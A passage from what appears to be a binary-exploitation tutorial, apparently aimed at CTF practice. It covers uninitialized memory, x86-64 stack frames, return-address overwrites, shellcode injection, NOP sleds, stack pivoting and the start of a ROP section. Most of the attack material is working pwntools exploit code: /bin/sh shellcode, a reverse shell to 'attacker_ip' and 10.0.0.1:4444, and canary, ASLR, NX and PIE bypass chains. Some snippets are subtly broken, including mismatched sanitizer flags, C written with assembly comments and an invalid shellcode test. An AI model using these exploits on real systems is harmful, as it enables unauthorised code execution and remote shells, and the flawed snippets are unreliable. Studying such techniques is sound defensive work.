Attacker controls stack values through function call parameters, predicting uninitialized leaks.

**Detection via Valgrind:**

```bash
valgrind --tool=memcheck --track-origins=yes ./program
```

Output:

```
Use of uninitialised value of size 8 at 0x...: ...
 Uninitialised value was created by a stack allocation at 0x...: ...
```

**Detection via AddressSanitizer:**

[Inference] ASAN's Initialization tracking detects use of uninitialized stack/heap memory with `-fsanitize=address -fsanitize-memory-track-origins=full`:

```bash
gcc -fsanitize=memory -fsanitize-memory-track-origins=full program.c -o program
./program
```

Reports:

```
WARNING: MemorySanitizer: use-of-uninitialized-value
```

**Runtime detection via GDB:**

```bash
gdb ./binary
(gdb) break vulnerable_function
(gdb) run
(gdb) info locals
(gdb) print uninitialized_var
# GDB may show garbage or refuse access depending on scope
```

Compare expected initialized value against observed garbage.

**Exploitation: format string via uninitialized**

Uninitialized buffer passed to format string function:

```c
char buf[0x100];
// buf uninitialized, contains stack data
printf(buf);  // Format string using stack data
```

Attacker doesn't control format string directly, but exploits uninitialized memory containing format specifiers from previous stack state.

**Exploitation: use-after-free via uninitialized**

Pointer allocated but not initialized:

```c
void **ptrs = malloc(0x100);  // Uninitialized pointers
free(ptrs[0]);                // Frees random pointer (UAF-like)
ptrs[0] = controlled_ptr;
```

Uninitialized pointer dereference resembles use-after-free vulnerability.

**Stack canary bypass via uninitialized**

Uninitialized memory containing canary values:

```c
int main() {
    canary = __stack_chk_guard;  // Compiler-inserted canary
    
    void *leaked_canary;
    printf("%p\n", leaked_canary);  // Uninitialized, might contain canary
}
```

[Unverified] If uninitialized read happens to contain actual canary value, subsequent overflow bypasses canary check. Probability extremely low in practice; requires specific memory layout.

**Heap chunk initialization patterns**

Identify chunks containing previous allocation residue:

```bash
gdb ./binary
(gdb) break malloc
(gdb) commands
> printf "malloc(%d) at %p\n", $rdi, $rax
> x/16x $rax
> continue
> end
(gdb) run
```

Examine malloc return contents; uninitialized allocations show garbage.

**Calloc vs malloc distinction:**

```c
malloc(size)   // Uninitialized, fast
calloc(n, size) // Zero-initialized, slower, secure
```

Binary analysis reveals which is used:

```bash
objdump -d /path/to/binary | grep "calloc\|malloc"
```

Identify where calloc (zero-init) is available but malloc (uninitialized) is used instead.

---

**Related memory corruption subtopics essential for comprehensive exploitation:** Heap layout manipulation through controlled allocation sequences enabling predictable corruption targets, integer overflows enabling buffer overflow preconditions, and format string vulnerabilities exploiting uninitialized buffers or attacker-controlled format specifiers for arbitrary read/write primitives.

---

# Stack Exploitation

## Stack Frame Structure

Understanding x86-64 stack organization is foundational for all stack exploitation techniques. Stack frames define memory layout enabling return address location, parameter passing, and local variable positioning.

**x86-64 calling convention (System V AMD64 ABI)**

Function calls establish predictable stack layout:

```
High addresses
┌─────────────────────┐
│   Caller's local    │
│      variables      │
├─────────────────────┤
│   Return address    │ <- RSP points here after call
│   (pushed by call)  │
├─────────────────────┤
│  Callee's local     │
│   variables &       │
│   spill space       │
├─────────────────────┤
│   RBP (if saved)    │
│                     │
Low addresses
```

**Function prologue establishes frame:**

```
push rbp              ; Save caller's base pointer
mov rbp, rsp          ; Establish new base pointer
sub rsp, 0x20         ; Allocate 32 bytes local space
```

**Assembly inspection:**

```bash
objdump -d /path/to/binary | grep -A 5 "push.*rbp"
```

Output shows prologue pattern:

```
0000000000401150 <function>:
  401150:	55                   	push   rbp
  401151:	48 89 e5             	mov    rbp,rsp
  401154:	48 83 ec 20          	sub    rsp,0x20
```

**Radare2 function analysis:**

```bash
r2 /path/to/binary
> aaa
> pdf @ 0x401150
```

Output displays:

```
; function prologue
0x401150 push rbp
0x401151 mov rbp, rsp
0x401154 sub rsp, 0x20
```

**Stack parameter passing (first 6 integer arguments)**

Parameters passed via registers, not stack:

```c
void func(long a, long b, long c, long d, long e, long f, long g);
// Arguments: RDI, RSI, RDX, RCX, R8, R9, [RSP+8]
```

Disassembly shows parameter usage:

```
mov rax, rdi          ; First parameter (a)
mov rbx, rsi          ; Second parameter (b)
mov rcx, rdx          ; Third parameter (c)
```

**Stack-based parameters (7th+ arguments)**

Arguments beyond 6 parameters occupy stack above return address:

```
[RSP+0x8]    ; 7th parameter
[RSP+0x10]   ; 8th parameter
[RSP+0x18]   ; 9th parameter
```

Function accesses via:

```
mov rax, [rsp+0x8]    ; 7th parameter
mov rbx, [rsp+0x10]   ; 8th parameter
```

**Local variable layout**

Stack frame below RSP holds local variables:

```c
void func(void) {
    char buf[32];        ; [RBP-0x20] to [RBP-0x1]
    int x;               ; [RBP-0x24]
    int y;               ; [RBP-0x28]
}
```

**Stack frame disassembly analysis:**

```bash
gdb ./binary
(gdb) disassemble func
(gdb) break *0x401170
(gdb) run
(gdb) info frame
(gdb) info locals
```

Output:

```
Stack level 0, frame at 0x7ffffffde7e0:
 rip = 0x401170 in func; saved rip 0x401234
 saved rbp 0x7ffffffde7e0
 called by frame at 0x7ffffffde800
 Locals at 0x7ffffffde7e0, Previous frame's sp at 0x7ffffffde7e8
  (gdb) info locals
  buf = '\000' ...
  x = 0x0
```

**Buffer storage on stack:**

```bash
gdb ./binary
(gdb) break vulnerable_function
(gdb) run
(gdb) x/20x $rbp-0x30    ; Examine 32 bytes below RBP
```

Output shows buffer location and contents.

**Return address location**

Return address immediately above saved RBP:

```
[RBP+0x0]    ; Saved RBP
[RBP+0x8]    ; Return address <- Exploitation target
```

GDB inspection:

```bash
(gdb) x/2gx $rbp
0x7ffffffde7d0:	0x7ffffffde7f0	0x0000000000401234
```

First value: caller's RBP (0x7ffffffde7f0) Second value: return address (0x0000000000401234)

**Callee-saved registers preservation**

Functions using RBX, R12-R15, RBP must save/restore:

```
push rbp              ; Save RBP
push rbx              ; Save RBX
push r12              ; Save R12
sub rsp, 0x10         ; Local space
...
add rsp, 0x10
pop r12
pop rbx
pop rbp
ret
```

Stack layout with saved registers:

```
[RBP+0x8]    ; Return address
[RBP+0x0]    ; Saved RBP
[RBP-0x8]    ; Saved RBX
[RBP-0x10]   ; Saved R12
[RBP-0x18]   ; Local space begins
```

**GDB frame examination:**

```bash
(gdb) info frame
(gdb) x/16gx $rbp
```

Displays saved register values.

**Frame pointer elimination optimization**

Modern compilers with `-fomit-frame-pointer` eliminate RBP setup:

```
sub rsp, 0x30
mov rax, [rsp+0x20]   ; Access parameters relative to RSP
```

No RBP saved, complicates RBP-relative addressing but slightly more efficient.

**Detection:**

```bash
objdump -d /path/to/binary | grep -c "push.*rbp"
```

Low count indicates frame pointer elimination. Radare2 detects automatically:

```bash
r2 /path/to/binary
> aaa
> pdf @ func
```

RSP-relative addressing visible in disassembly.

**Red zone (x86-64 ABI)**

128-byte red zone below RSP reserved for leaf functions (no additional calls):

```
[RSP-0x80]   to [RSP-0x1]  ; Red zone (128 bytes)
RSP                        ; Stack pointer
[RSP+0x8]                  ; Return address
```

Leaf functions may store temporaries in red zone without adjusting RSP. Interrupted code (signal handlers) must not use red zone.

**GDB red zone observation:**

```bash
(gdb) info registers rsp
rsp            0x7ffffffde800	0x7ffffffde800
(gdb) x/20x $rsp-0x80
```

Verify red zone contents for signal handler safety.

**Stack alignment requirements**

x86-64 ABI requires RSP 16-byte aligned at function entry (after return address pushed):

```
Before call: RSP = 0x7ffffffde7d0 (aligned 16)
call func
After call (before prologue): RSP = 0x7ffffffde7c8 (unaligned, RSP-8 from before)
```

Compiler ensures prologue adjustment maintains 16-byte alignment. Misalignment causes crashes with SSE instructions or segfaults in glibc.

**Verification:**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) print ($rsp & 0xf)
$1 = 0x8              ; Unaligned by 8 (expected after call)
(gdb) step            ; Execute prologue
(gdb) print ($rsp & 0xf)
$2 = 0x0              ; Aligned after prologue adjustments
```

**Windows x64 calling convention differences**

First 4 arguments: RCX, RDX, R8, R9 (vs. RDI, RSI, RDX, RCX in Linux)

```c
// Windows
void func(long a, long b, long c, long d);
// Arguments: RCX, RDX, R8, R9

// Linux
void func(long a, long b, long c, long d);
// Arguments: RDI, RSI, RDX, RCX
```

Stack frame similar but register usage differs significantly for exploitation.

**ARM stack frames (32-bit)**

ARM uses stack differently:

```
Entry: SP points to first local variable location
Frame pointer (R11) optional
LR (link register) contains return address
```

Prologue:

```
push {r11, lr}        ; Save frame pointer and return address
add r11, sp, #4
sub sp, sp, #0x20
```

Return address accessed via LR register, not stack until saved.

---

## Return Address Overwriting

Return address overwriting is the fundamental stack exploitation primitive, redirecting execution to attacker-controlled code through buffer overflow into return address location.

**Vulnerability prerequisites**

Buffer on stack without bounds checking:

```c
void vulnerable(char *input) {
    char buf[32];
    strcpy(buf, input);    ; No bounds check
    ; Return address at [RBP+0x8]
}
```

Input size exceeds buffer size, overflow reaches return address.

**Buffer layout analysis**

Determine distance from buffer start to return address:

```c
void vulnerable(char *input) {
    char buf[32];          ; [RBP-0x20] to [RBP-0x1]
    // ... unused stack ...
    // [RBP+0x0]           ; Saved RBP
    // [RBP+0x8]           ; Return address
}
```

Distance calculation:

- Buffer at [RBP-0x20]
- Return address at [RBP+0x8]
- Offset: 0x20 + 0x8 = 0x28 (40 bytes)

**Payload construction**

Payload structure:

```
[40 bytes: buffer fill] [8 bytes: new return address] [optional: extra data]
```

Python PoC:

```python
offset = 40
payload = b'A' * offset
payload += p64(0x401234)   # New return address (8 bytes, 64-bit)
```

**GDB verification**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run $(python3 -c "print('A'*40 + 'BBBBBBBB')")
(gdb) x/20x $rbp-0x30     ; Examine stack
(gdb) x/2gx $rbp          ; Examine RBP and return address
0x7ffffffde7d0:	0x4141414141414141	0x4242424242424242
```

First value: overwritten saved RBP (0x41 = 'A') Second value: overwritten return address (0x42 = 'B')

**Precise offset determination**

Dynamic offset finding via pattern:

```python
pattern = cyclic(100)       # Generate cyclic pattern
p.send(pattern)
# Monitor crash address
```

Radare2 cyclic pattern:

```bash
r2 /path/to/binary
> wop cyclic 100
> wop
```

GDB pattern offset:

```bash
gdb ./binary
(gdb) run $(python3 -c "print(cyclic(100))")
# Binary crashes at address 0x6161616b (example)
# In another terminal:
$ python3 -c "print(cyclic_find(0x6161616b))"
40
```

**Return address target selection**

Common targets:

1. **Shellcode address** (if injectable)
2. **One-gadget** (single gadget enabling shell)
3. **ROP chain** (chain of existing instructions)
4. **Libc function** (system(), execve())

**Shellcode injection:**

```python
offset = 40
shellcode = asm(shellcraft.sh())   # Generate /bin/sh shellcode
payload = shellcode
payload += b'\x00' * (offset - len(shellcode))
payload += p64(stack_addr + nop_len)  # Jump to shellcode
```

**One-gadget selection:**

One-gadget provides single instruction sequence enabling shell:

```bash
one_gadget ./libc.so.6
0x4f365 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    rax == NULL
    
0x4f3d2 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    [rsp+0x30] == NULL
```

Verify constraints before using:

```python
offset = 40
payload = b'A' * offset
payload += p64(libc_base + 0x4f365)
```

**ROP chain construction:**

```python
offset = 40
rop = ROP(binary)

rop.call('system', [elf.search(b'/bin/sh').__next__()])

payload = b'A' * offset
payload += rop.chain()
```

**Stack canary bypass considerations**

With stack canary enabled:

```
[buf] [canary] [saved RBP] [return address]
```

Offset must be adjusted to overwrite canary correctly first, then return address. Canary typically 8 bytes (x86-64).

**Canary location determination:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) x/30x $rbp-0x30
```

Look for 8-byte value matching `$gs:0x28` (canary location):

```bash
(gdb) x/gx $gs:0x28
0x7ffff7e20cc0:	0x1234567890abcdef
```

**Canary leak technique:**

Leak canary from memory before overflow:

```python
# Format string or information disclosure
leaked_canary = leak_canary()

offset = 40
payload = b'A' * offset
payload += leaked_canary     # Correct canary
payload += p64(0x0)          # Saved RBP
payload += p64(target_addr)  # Return address
```

**Detection via checksec:**

```bash
checksec --file=./binary
STACK CANARY    : Enabled
```

**ASLR interaction**

With ASLR, absolute addresses randomize. Solutions:

1. **Return to PLT** (addresses fixed within binary)
2. **Info leak** (leak libc/stack addresses)
3. **ROP** (chain instructions, less address-dependent)

**Info leak technique:**

Use format string or uninitialized read to leak addresses:

```python
# Leak stack address
leaked_stack = leak_via_format_string()

# Calculate shell position
shell_offset = 0x50
payload_addr = leaked_stack + shell_offset

offset = 40
payload = shellcode
payload += b'\x00' * (offset - len(shellcode))
payload += p64(payload_addr)
```

**Return to PLT technique:**

PLT addresses fixed across ASLR:

```bash
objdump -d /path/to/binary | grep "system@plt"
```

Output:

```
0000000000401030 <system@plt>:
  401030:	ff 25 ea 2f 00 00    	jmp    QWORD PTR [rip+0x2fea]
```

Address 0x401030 remains constant, GOT entry contains dynamically-resolved system address.

**Exploitation:**

```python
offset = 40
payload = b'A' * offset

# Set RDI to /bin/sh argument
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(elf.search(b'/bin/sh').__next__())
rop.call('system')

payload += rop.chain()
```

**NX (No-Execute) bit bypass**

NX prevents code execution on stack:

```bash
checksec --file=./binary
NX              : Enabled
```

Bypasses:

1. **ROP chains** (execute existing code)
2. **Return to libc** (call libc functions)
3. **mprotect()** (change memory permissions)

**Return to mprotect technique:**

```python
rop = ROP(binary)

# mprotect(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC)
rop.mprotect(shellcode_addr, 0x1000, 7)
rop.raw(shellcode_addr)

payload = b'A' * offset
payload += rop.chain()
```

**PIE (Position Independent Executable) interaction**

PIE randomizes binary base addresses:

```bash
checksec --file=./binary
PIE             : Enabled
```

All binary addresses become relative to unknown base. Solutions:

1. **Info leak** (leak binary base via relative address reveal)
2. **Gadgets relative to leaks** (compute offsets)
3. **Libc-only ROP** (bypass binary ASLR entirely)

**Binary base leak:**

```python
# Use format string to leak binary address
leaked_addr = leak_from_got()

# GOT entry location reveals binary base
binary_base = leaked_addr - elf.got['puts']

# Adjust all addresses
target = binary_base + 0x1234
```

---

## Shellcode Injection

Shellcode is self-contained assembly executing arbitrary commands, typically spawning interactive shell or reverse shell connection. Injection places shellcode in memory, return address redirects execution.

**Shellcode basics**

Minimal x86-64 Linux shellcode executing `exit(0)`:

```asm
mov rax, 0x3c      ; syscall number for exit
xor rdi, rdi       ; exit code 0
syscall
```

Binary representation:

```
b8 3c 00 00 00     ; mov eax, 0x3c
48 31 ff           ; xor rdi, rdi
0f 05              ; syscall
```

**Generation via pwntools:**

```python
from pwn import *

# Generate shellcode
shellcode = asm(shellcraft.sh())
print(shellcode)
```

Output example:

```
b'\x6a\x3b\x58\x99\x52\x48\xbb/bin/sh\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
```

**Shellcode categories**

1. **Spawn shell** (`execve("/bin/sh", NULL, NULL)`)
2. **Reverse shell** (connect back, read/execute commands)
3. **Bind shell** (listen for connection)
4. **Read file** (read and leak file contents)
5. **Write file** (place backdoor or flag)

**Execve shellcode (x86-64):**

```asm
mov rax, 0x3b          ; syscall: execve
lea rdi, [rel bin_sh]  ; /bin/sh string address
xor rsi, rsi           ; argv = NULL
xor rdx, rdx           ; envp = NULL
syscall

bin_sh:
    db "/bin/sh", 0x00
```

**Reverse shell pattern:**

```python
shellcode = asm(shellcraft.connect('attacker_ip', attacker_port))
shellcode += asm(shellcraft.dupsh())
```

Connects to attacker, duplicates stdin/stdout/stderr, executes shell.

**Null byte elimination**

Null bytes (`\x00`) terminate strings, breaking exploitation:

```c
strcpy(buf, payload);  // Stops at first null byte
```

Shellcode generation avoids null bytes:

```python
shellcode = asm(shellcraft.sh())
if b'\x00' in shellcode:
    print("ERROR: Contains null bytes")
```

**Null byte elimination techniques:**

1. **Use different immediates:**

```asm
xor eax, eax           ; eax = 0 (no null bytes)
mov eax, 0             ; Contains null bytes - avoid
```

2. **Relocate strings:**

```asm
lea rdi, [rel bin_sh]  ; Position-independent, no nulls
```

3. **Use pwntools encoding:**

```python
shellcode = asm(shellcraft.sh())
encoded = encode(shellcode)
decoder = shellcraft.decode('encoded_shellcode')
```

**pwntools shellcode generation:**

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Generate /bin/sh shellcode
shellcode = asm(shellcraft.sh())

# Alternative: read file
shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3, 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 0x100))

# Reverse shell
shellcode = asm(shellcraft.connect('10.0.0.1', 4444))
shellcode += asm(shellcraft.dupsh())
```

**Shellcode placement strategies**

1. **On stack** (return address points to stack buffer)
2. **In BSS section** (writable, no ASLR if partial ASLR)
3. **In data section** (similar to BSS)
4. **Heap** (allocate and overflow into)

**Stack-based shellcode injection:**

```python
offset = 40
shellcode = asm(shellcraft.sh())
nops = b'\x90' * (offset - len(shellcode))

payload = shellcode
payload += nops
payload += p64(shellcode_addr)
```

Requires reliable stack address calculation.

**BSS-based injection:**

```bash
objdump -s -j .bss /path/to/binary | head -20
```

Identify BSS location:

```python
bss_addr = 0x601000  # Common location, verify with objdump

offset = 40
payload = b'A' * offset
payload += p64(bss_addr)
```

Write shellcode to BSS via separate vulnerability.

**Shellcode self-modification**

Shellcode modifies itself to eliminate null bytes or anti-analysis code:

```asm
lea rax, [rel decode_start]
mov ecx, shellcode_size
.decode_loop:
xor byte [rax], xor_key
inc rax
loop .decode_loop

decode_start:
    ; Encrypted shellcode follows
```

Pwntools encodes automatically:

```python
shellcode = asm(shellcraft.sh())
encoded = encode(shellcode, 'xor')
```

**Testing shellcode standalone:**

```python
from pwn import *

# Test shellcode directly
shellcode = asm(shellcraft.sh())
p = process(shellcode)
p.interactive()
```

GDB verification:

```bash
gdb -q
(gdb) file /dev/stdin <<< $(python3 -c "import sys; sys.stdout.buffer.write(shellcode)")
(gdb) break *0x0
(gdb) run
```

**Syscall table reference (x86-64 Linux):**

```
rax = 1   : write
rax = 2   : open
rax = 3   : close
rax = 4   : stat
rax = 5   : fstat
rax = 59  : execve
rax = 60  : exit
```

Complete table: `/usr/include/asm/unistd_64.h`

**ARM shellcode generation:**

```python
context.arch = 'arm'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
```

Thumb mode (16-bit instructions):

```python
context.thumb = True
shellcode = asm(shellcraft.sh())
```

**Windows PE shellcode:**

```python
context.arch = 'amd64'
context.os = 'windows'

shellcode = asm(shellcraft.cmd())
```

Different syscall conventions and APIs.

---

## NOP Sleds

NOP sleds (No OPeration sequences) enable reliable shellcode execution despite address uncertainty. NOP instruction does nothing, execution continues to next instruction. Sled of NOPs leading to shellcode tolerates return address approximation.

**NOP sled concept**

```
NOP sled:
0x7ffffffde7d0: 90 90 90 90 90 90 90 90   ; NOP sled
0x7ffffffde7d8: 90 90 90 90 90 90 90 90
0x7ffffffde7e0: 90 90 90 90 90 90 90 90

Shellcode:
0x7ffffffde7e8: b8 3b 00 00 00            ; mov eax, 0x3b
0x7ffffffde7ed: 48 31 ff                 ; xor rdi, rdi
0x7ffffffde7f0: 0f 05                    ; syscall
```

Return address anywhere in sled executes all NOPs, eventually reaching shellcode.

**Construction:**

```python
nop_sled = b'\x90' * 1000
shellcode = asm(shellcraft.sh())
payload = nop_sled + shellcode

# Return address can point anywhere in sled
return_addr = stack_base + 100  # Anywhere in sled works
```

**x86 NOP instruction**

Primary NOP:

```asm
nop                    ; 0x90
```

Multi-byte NOPs (alignment without size waste):

```asm
nop                    ; 1 byte
lea eax, [eax]        ; 2 bytes (0x8d 0x44 0x00 0x00)
lea eax, [eax+0x0]    ; 3 bytes
```

Pwntools handles automatically:

```python
nops = b'\x90' * 200
```

**ARM NOP:**

```asm
nop                    ; 0xe1a00000 (mov r0, r0)
```

Python:

```python
context.arch = 'arm'
nops = asm('nop') * 200
```

**Sled sizing**

Sled size depends on address uncertainty:

- Partial ASLR (lower bits fixed): Small sled (10-50 NOPs)
- Full ASLR (complete randomization): Large sled (500-10000 NOPs)
- Known address: No sled needed

**ASLR configuration affects sled necessity:**

```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = no ASLR
# 1 = some ASLR
# 2 = full ASLR
```

**Sled-based exploitation:**

```python
# Assume stack base uncertainty of ±0x1000
stack_base = 0x7ffffffde000

nop_count = 2000
sled = b'\x90' * nop_count
shellcode = asm(shellcraft.sh())
payload = sled + shellcode

# Target somewhere in middle of sled
return_addr = stack_base + nop_count // 2

offset = 40
exploit = b'A' * offset
exploit += p64(return_addr)

p.send(exploit)
```

**Sled inefficiency**

Large sleds waste bandwidth and storage:

```python
# 10KB sled for 100-byte shellcode
sled = b'\x90' * 10000
shellcode = asm(shellcraft.sh())
total = len(sled + shellcode)  # 10100 bytes
```

Modern mitigations reduce sled necessity.

**Return-oriented sleds**

Instead of NOP sled, chain gadgets:

```asm
pop rax ; ret        ; Gadget 1
pop rax ; ret        ; Gadget 2
pop rax ; ret        ; Gadget 3
```

Repeated instructions can serve similar purpose, though less reliable.

**Info leak replacing sled**

Rather than guessing address with sled, leak actual address:

```python
# Format string leaks stack address
leaked_addr = leak_stack_address()

# Calculate shellcode position exactly
shellcode_addr = leaked_addr + known_offset

offset = 40
payload = b'A' * offset
payload += p64(shellcode_addr)
```

Eliminates sled, more efficient.

**Sled with stack canary**

Canary positioned before return address:

```
[sled] [shellcode] [canary] [saved RBP] [return address]
```

Sled must not overwrite canary:

```python
canary_offset = 0x30
shellcode_offset = canary_offset - len(shellcode)

sled = b'\x90' * shellcode_offset
payload = sled + shellcode
payload += p64(correct_canary)
payload += p64(0x0)
payload += p64(return_addr)
```

**ASLR mitigation via brute force sled**

With partial ASLR, sled enables reliable exploitation despite randomization:

```python
# Partial ASLR: lower 12 bits randomized
# Sled with 2048 NOPs tolerates 12-bit randomization

for attempt in range(100):
    sled = b'\x90' * 2048
    shellcode = asm(shellcraft.sh())
    payload = sled + shellcode
    
    return_addr = 0x7ffffffde000 + random(0x1000)
    
    p = process('./binary')
    p.send(payload)
    p.send(p64(return_addr))
    # If sled hits, shellcode executes
```

**Sled with position-independent shellcode**

Shellcode using RIP-relative addressing works anywhere:

```asm
lea rdi, [rel bin_sh]  ; Position-independent
mov rax, 0x3b
syscall
```

Sled not strictly necessary for position-independent shellcode, but still improves reliability.

**Egg hunter (alternative to sled)**

Egg hunter searches memory for marked shellcode:

```asm
mov rax, 0x50905090  ; Egg marker (repeated NOPs)
.search:
cmp [rcx], rax
je .found
inc rcx
jmp .search
.found:
jmp rcx+8           ; Jump to shellcode after egg
```

Smaller than large sled but more complex. [Inference] Rarely used in modern exploitation due to info leaks and other reliable techniques.

**Detection and analysis:**

```bash
objdump -d /path/to/binary | grep -c "nop"
```

Counts NOP instructions. Large counts may indicate padding or deliberate sled.

**Sled in final exploit chain:**

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Build exploit
offset = 40
nop_sled = b'\x90' * 500
shellcode = asm(shellcraft.sh())
payload = nop_sled + shellcode

# Pad to offset
payload += b'X' * (offset - len(payload))

# Return address to middle of sled
return_addr = stack_base + len(nop_sled) // 2
payload += p64(return_addr)

p = process('./binary')
p.send(payload)
p.interactive()
```

---

**Related stack exploitation subtopics essential for comprehensive attacks:** Format string exploitation enabling information leaks and arbitrary writes, ROP chain construction bypassing NX/DEP protections, and signal handler exploitation using stack frames during asynchronous execution.

---

## Stack Pivoting

Stack pivoting redirects ESP/RSP to attacker-controlled memory, enabling ROP gadget chains in heap, data sections, or other non-stack regions. Critical when stack space is limited or when exploiting vulnerabilities not directly on stack.

**Stack pivot concept**

Standard exploitation assumes gadget chain on stack:

```
RSP points to stack:
[chain_gadget_1]
[chain_gadget_2]
[chain_gadget_3]
```

Stack pivoting redirects RSP elsewhere:

```
Original RSP: 0x7ffffffde000 (stack, limited space)
New RSP: 0x601000 (heap, attacker-controlled, large space)

mov rsp, 0x601000  ; Stack pivot gadget
ret                ; Continue ROP from new location
```

**Pivot gadget identification**

Search for instruction sequences setting RSP:

```bash
r2 /path/to/binary
> /c "mov rsp"
> /c "add rsp"
> /c "xchg rsp"
```

Common pivot gadgets:

```asm
mov rsp, rax ; ret        ; Pivot to rax
mov rsp, rdi ; ret        ; Pivot to rdi
add rsp, rbx ; ret        ; Add to RSP
xchg rsp, rax ; ret       ; Exchange RSP with rax
```

**Radare2 gadget search:**

```bash
r2 /path/to/binary
> e search.maxhits=1000
> /c "mov rsp, rax"
```

Lists all occurrences with addresses.

**ROP search tools:**

**ROPgadget:**

```bash
ROPgadget --binary /path/to/binary --search "mov rsp"
```

Output:

```
0x0000000000401234 : mov rsp, rax ; ret
0x0000000000401567 : mov rsp, rdi ; ret
0x0000000000401890 : add rsp, rbx ; ret
```

**Ropper:**

```bash
ropper --file /path/to/binary --search "mov rsp"
```

**Basic stack pivot exploit**

Prerequisites:

1. Identify pivot gadget address
2. Control register (RAX, RDI, etc.) to new RSP value
3. Place ROP chain at new location
4. Trigger gadget via return address

**Exploitation sequence:**

```python
from pwn import *

# Vulnerable binary
p = process('./binary')

# Gadget addresses
pivot_gadget = 0x401234      # mov rsp, rax; ret
pop_rax_ret = 0x401567       # pop rax; ret

# New stack location (heap)
new_rsp = 0x602000

# ROP chain at new location
rop = ROP(binary)
rop.system('/bin/sh')

# Build chain for pivot
chain = p64(pop_rax_ret)
chain += p64(new_rsp)
chain += p64(pivot_gadget)
chain += rop.chain()

# Exploit vulnerable buffer
offset = 40
payload = b'A' * offset
payload += chain

p.send(payload)
p.interactive()
```

**Heap-based ROP chain setup**

Write ROP chain to heap via separate vulnerability:

```python
# Use write primitive to place chain in heap
write_gadget = 0x401890  # mov [rdi], rax; ret

chain_addr = 0x602000
for i, gadget_addr in enumerate(rop_chain):
    write_at(chain_addr + i*8, gadget_addr)
```

**Alternative: Use data section**

Binary data section often writable, fixed address (no ASLR with partial ASLR):

```bash
objdump -s -j .data /path/to/binary | head -20
```

Locate `.data` section address:

```python
data_section = 0x601000
rop_chain_addr = data_section + 0x100

# Place chain in data section
for i, gadget in enumerate(rop_chain):
    write_primitive(rop_chain_addr + i*8, gadget)

# Pivot to data section
pivot_to_data = ROP(binary)
pivot_to_data.raw(pop_rsp_gadget)
pivot_to_data.raw(rop_chain_addr)
```

**Stack pivot with add/sub**

Pivot via relative offset when direct mov unavailable:

```asm
add rsp, rbx ; ret
```

Calculation:

```
Current RSP: 0x7ffffffde000
Target RSP: 0x602000
Offset: 0x602000 - 0x7ffffffde000 = negative (infeasible)
```

Alternative with sub:

```asm
sub rsp, rbx ; ret
```

Set RBX to 0x7ffffffde000 - 0x602000, use sub to pivot down.

**Gadget chain for indirect pivot:**

```python
# Set up registers for add-based pivot
rop = ROP(binary)
rop.raw(pop_rax_ret)
rop.raw(0x602000)
rop.raw(pop_rbx_ret)
rop.raw(0x10000)
rop.raw(add_rsp_rbx_ret)  # add rsp, 0x10000; ret
```

**Stack pivot with xchg**

Exchange RSP with register:

```asm
xchg rsp, rax ; ret
```

Technique:

```python
rop = ROP(binary)
rop.raw(pop_rax_ret)
rop.raw(new_rsp_value)
rop.raw(xchg_rsp_rax_ret)
```

**Leave instruction pivot**

`leave` restores RSP from RBP:

```asm
leave          ; mov rsp, rbp; pop rbp
ret
```

Gadget available in most binaries:

```python
# Control RBP to new location
rop = ROP(binary)
rop.raw(pop_rbp_ret)
rop.raw(new_rsp_value)
rop.raw(leave_ret_gadget)  # Pivots RSP to RBP
```

**Pivot with setmem vulnerability**

Use vulnerability allowing memory write:

```c
void write_to_memory(void *addr, long value) {
    *(long *)addr = value;  // Write vulnerability
}
```

Exploit writes to RSP pseudo-register or manipulates stack:

```python
# Write fake return address to heap
write_at(heap_chain_addr, pivot_gadget_addr)
write_at(heap_chain_addr + 8, rop_chain_data_1)

# Pivot when function returns
```

**Leave-based pivot with stack corruption**

Manipulate stack frame to corrupt RBP:

```
Original stack:
[buffer] [canary] [saved RBP] [return address]

Corrupted:
[buffer] [canary] [new_rsp] [pivot_gadget]
```

When `leave` executes:

```asm
mov rsp, rbp     ; RSP = corrupted_rbp = new_rsp
pop rbp          ; RBP = pivot_gadget (garbage, but doesn't matter)
ret              ; Continues from new_rsp
```

**GDB verification of pivot**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run payload
(gdb) x/10i $rip
(gdb) stepi
# Watch RSP change
(gdb) print $rsp
# Verify pivot occurred
```

**Pivot with limited gadget availability**

When direct RSP gadgets unavailable, chain multiple instructions:

```python
# Use pop; pop; ret gadget to skip stack values
rop = ROP(binary)
rop.raw(pop_pop_ret)  # Skips 2 stack values
rop.raw(0x0)          # Garbage
rop.raw(0x0)          # Garbage
# Continues execution after pivot setup
```

**Double pivot technique**

Pivot twice for complex ROP chains:

```python
# First pivot: stack -> heap
first_pivot = ROP(binary)
first_pivot.raw(pivot_to_heap)

# Second pivot: heap -> data section (for final gadgets)
second_pivot = ROP(binary)
second_pivot.raw(pivot_to_data)

# Chain them
final_chain = first_pivot.chain() + second_pivot.chain()
```

**Detecting pivot gadgets in binary**

```bash
objdump -d /path/to/binary | grep -E "mov rsp|add rsp|xchg.*rsp|leave"
```

Lists potential pivot instructions.

**Ropper automated search:**

```bash
ropper --file /path/to/binary --chain "exec"
```

Automatically generates exploit chains including pivots if necessary.

---

## Return-Oriented Programming (ROP) Basics

Return-oriented programming chains existing instruction sequences (gadgets) to achieve arbitrary computation without injecting code. Each gadget ends with `ret`, popping next gadget address from stack.

**ROP principle**

```
Stack layout for ROP chain:
0x7ffffffde000: gadget1_addr
0x7ffffffde008: gadget2_addr
0x7ffffffde010: gadget3_addr
0x7ffffffde018: target_function_addr

Execution:
ret                    ; Pop 0x7ffffffde000 into RIP (execute gadget1)
[gadget1 code]
ret                    ; Pop 0x7ffffffde008 into RIP (execute gadget2)
[gadget2 code]
ret                    ; Continue chain
```

**Gadget types**

1. **Register setters** (control arguments)

```asm
pop rdi ; ret           ; Set RDI (1st arg)
